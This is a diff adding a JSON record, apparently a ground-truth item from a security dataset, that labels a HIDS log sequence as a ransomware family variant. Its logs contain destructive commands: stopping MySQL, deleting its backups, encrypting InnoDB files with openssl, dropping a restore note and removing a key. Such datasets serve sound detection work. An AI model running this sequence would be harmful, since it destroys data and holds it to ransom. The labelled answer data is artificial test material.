@@ -1,0 +1,41 @@
+{
+ "unit": 1093,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-005",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "勒索家族变体：阶段组合与 CASE-005 不完全一致"
+ },
+ "technique": "停用 mysqld 后删除归档备份并加密 InnoDB 表空间文件",
+ "sources": [
+  "hids",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-07 22:16:34",
+   "source": "hids",
+   "log_id": "HID0489292",
+   "content": "systemctl stop mysqld && rm -rf /var/backups/mysql mysqld mysqld systemctl stop mysqld <== /bin/bash -c 'syste",
+   "event_id": "1093-HID0489292"
+  },
+  {
+   "timestamp": "2026-07-07 22:18:34",
+   "source": "hids",
+   "log_id": "HID0489302",
+   "content": "find /var/lib/mysql -name \"ib*.ibd\" -exec openssl enc -aes-256-cbc -in {} -out {}.enc \\; <== /bin/bash -c 'fin",
+   "event_id": "1093-HID0489302"
+  },
+  {
+   "timestamp": "2026-07-07 22:22:34",
+   "source": "hids",
+   "log_id": "HID0489323",
+   "content": "printf \"data renamed to .enc\" > /srv/README_RESTORE.txt && rm -f /tmp/.k <== /bin/bash -c 'printf' <== /usr/sb",
+   "event_id": "1093-HID0489323"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
